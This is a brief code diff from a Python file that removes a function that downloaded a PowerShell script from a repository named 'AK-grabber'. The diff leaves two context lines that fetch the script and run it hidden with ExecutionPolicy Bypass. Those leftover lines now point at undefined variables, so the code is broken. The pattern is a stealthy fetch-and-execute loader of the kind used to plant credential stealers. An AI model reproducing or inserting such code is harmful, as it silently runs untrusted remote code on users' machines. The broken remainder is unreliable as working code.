@@ -171,13 +171,6 @@ class Tasks:
     def WaitForAll() -> None: 
         for thread in Tasks.threads:
             thread.join()  
-
-            
-
-
-def download_and_execute_powershell():
-    url = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/main.ps1"
-    file_path = "main.ps1"
     
     urllib.request.urlretrieve(url, file_path)
     os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')
